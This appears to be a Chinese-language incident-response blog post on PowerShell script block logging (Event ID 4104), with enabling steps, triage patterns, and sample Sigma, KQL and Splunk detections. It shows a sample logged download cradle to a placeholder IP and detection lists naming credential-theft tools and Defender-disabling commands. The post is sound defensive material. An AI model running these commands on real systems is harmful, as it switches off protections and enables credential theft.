---
title: "PowerShell Event ID 4104 详解:面向 DFIR 的脚本块日志"
description: "脚本块日志是 Windows 上最有用的免费防御控制。它记录每次执行的脚本完整正文 —— 包括混淆和驻留内存的 —— 事件 ID 是 4104。"
date: "2026-05-17"
---

PowerShell 开启脚本块日志后,引擎会记录每个执行脚本的正文 —— 交互式命令、从磁盘加载的脚本,以及任何通过 `Invoke-Expression` 或 `IEX` 反射进内存的内容。记录落在[通道](/zh/blog/what-is-an-evtx-file) `Microsoft-Windows-PowerShell/Operational`,事件 ID 是 **4104**,「Creating Scriptblock text」。

## 你能拿到什么

```xml
<Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">$wc = New-Object Net.WebClient; $wc.DownloadString('http://203.0.113.5/a')</Data>
<Data Name="ScriptBlockId">{guid}</Data>
<Data Name="Path">C:\Users\alice\Downloads\setup.ps1</Data>
```

长脚本会被 PowerShell 拆成多条 4104 记录(每条一个 message number)。把它们合并回去是必须的 —— 片段很容易误读。

## 怎么开启

设置在 `HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging = 1`,等同于组策略 *Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging*。PowerShell 侧没有值得衡量的开销 —— 哪里都开启。

## 它能抓到的、别的抓不到的东西

PowerShell 引擎在任何编码、压缩或内存中反射**之后**记录脚本。这意味着:

- 一个 `-EncodedCommand` 调用既会记录编码后的启动器(在对应的 ProcessCreate / 4688 里),也会记录解码后的正文(在 4104 里)。
- 一个下载并 `Invoke-Expression` 远程载荷的脚本,记录的是*执行*的正文,而不是包装器。
- 使用 AMSI 绕过的攻击者仍会留下 4104 记录 —— 绕过影响的是扫描,不是日志。

这是平台上最有用的免费防御控制。没有 EDR 的防御者通常都有这个。

## 规模化分诊 4104

4104 语料库中的高信号模式:

- `DownloadString`、`DownloadFile`、`Invoke-WebRequest`、`Net.WebClient` —— 远程内容拉取。
- `IEX`、`Invoke-Expression` —— 动态执行。
- `FromBase64String`、`[System.Convert]::FromBase64String` —— 编码载荷。
- `Add-MpPreference -ExclusionPath` —— Defender 篡改。
- `Set-MpPreference -DisableRealtimeMonitoring` —— Defender 篡改。
- `[System.Reflection.Assembly]::Load`、`[Reflection.Emit]` —— 内存中程序集加载。
- `Invoke-Mimikatz`、`Invoke-Kerberoast`、`Invoke-BloodHound` —— 已知攻击工具。

单一匹配本身不一定恶意(管理员也用 `DownloadString`),但组合就不一样了。从 4104 按时间戳 + 进程透视到对应的 [Sysmon event 1](/zh/blog/sysmon-event-id-1-process-create) / 4688,恢复完整调用上下文。

## Sigma 规则样例 —— 脚本块中的攻击 PowerShell 工具

```yaml
title: Suspicious PowerShell Scriptblock — Offensive Tool Indicators
id: 4f1a3b8d-2c5e-4d8f-9a3b-1c2d3e4f5a6b
status: stable
description: PowerShell scriptblock body contains strings characteristic of offensive tooling, encoded payloads, or in-memory reflection.
references:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://attack.mitre.org/techniques/T1027/
logsource:
  product: windows
  service: powershell
  category: ps_script
detection:
  selection_offensive:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Invoke-Mimikatz'
      - 'Invoke-Kerberoast'
      - 'Invoke-BloodHound'
      - 'Invoke-DCSync'
      - 'New-PSInjection'
      - 'Get-PassHashes'
  selection_reflective:
    EventID: 4104
    ScriptBlockText|contains:
      - 'System.Reflection.Assembly]::Load'
      - '[Reflection.Emit]'
      - 'FromBase64String'
  selection_defender_tamper:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Set-MpPreference -DisableRealtimeMonitoring'
      - 'Add-MpPreference -ExclusionPath'
      - 'Set-MpPreference -DisableIOAVProtection'
  condition: selection_offensive or selection_reflective or selection_defender_tamper
falsepositives:
  - Defenders running known offensive tooling for testing (whitelist by host)
  - Software installers using reflection for legitimate purposes
level: high
tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense_evasion
```

## KQL 样例 —— 低权限用户的编码 PowerShell

```kusto
let encoded =
    Event
    | where Source == "Microsoft-Windows-PowerShell" and EventID == 4104
    | extend XmlData = parse_xml(EventData)
    | extend ScriptBlockText = tostring(XmlData.EventData.Data[2])
    | where ScriptBlockText contains "FromBase64String"
       or ScriptBlockText matches regex @"\b-e(?:nc|ncodedcommand)?\b\s"
    | project TimeGenerated, Computer, UserId=tostring(XmlData.System.Security["@UserID"]), ScriptBlockText;
encoded
| where UserId !startswith "S-1-5-18"   // exclude LocalSystem
   and UserId !startswith "S-1-5-19"
   and UserId !startswith "S-1-5-20"
| order by TimeGenerated desc
```

## Splunk 样例 —— 来自 PowerShell 的 Defender 篡改

```spl
index=powershell EventCode=4104
   ( ScriptBlockText="*Set-MpPreference*DisableRealtimeMonitoring*"
     OR ScriptBlockText="*Add-MpPreference*ExclusionPath*"
     OR ScriptBlockText="*Set-MpPreference*DisableIOAVProtection*" )
| table _time host UserID ScriptBlockText
```

## ATT&CK 对应

- **T1059.001 —— Command and Scripting Interpreter: PowerShell**:每个攻击型 4104 都对应这里。PowerShell 是现代入侵中最常被引用的执行技术之一。
- **T1027 —— Obfuscated Files or Information**:编码 / Base64 / `FromBase64String` 模式。
- **T1059.001 + T1140 —— Deobfuscate/Decode Files or Information**:引擎记录的是*解码后*的形式,这正是 4104 相对于 [4688](/zh/blog/event-id-4688-process-creation) 的价值。
- **T1562.001 —— Impair Defenses: Disable or Modify Tools**:`Set-MpPreference -DisableRealtimeMonitoring`、`Add-MpPreference -ExclusionPath`。
- **T1003.001 —— OS Credential Dumping: LSASS Memory**:脚本体中的 `Invoke-Mimikatz`、`MiniDump`、`comsvcs.dll` 模式。
- **T1558.003 —— Kerberoasting**:`Invoke-Kerberoast`、`Rubeus kerberoast` 模式。

## 看起来完全像攻击的误报

- **管理员运维脚本**有时合法使用 `Invoke-Expression` 做模板化配置。组合通常很短、可重复、来自已知管理员会话。
- **Defender 管理**脚本(公司 IT)合法调用 `Set-MpPreference` 推送排除列表。按脚本的签名证书或主机 SID 加白。
- **Chocolatey / WinGet / 包安装器**合法使用 Base64 编码的 PowerShell。模式:简短、白天、来自构建/管理员主机。
- **红队 / 渗透测试**活动看起来和真实攻击一模一样。协调任务窗口并标记操作手源 IP。

## 盲点

4104 记录*脚本*正文。它不记录每条语句执行、函数返回值或变量值。后者需要 transcription(事件 4103,「Module logging」)或真正的 EDR。4104 告诉你跑了什么;其它的告诉你它做了什么。
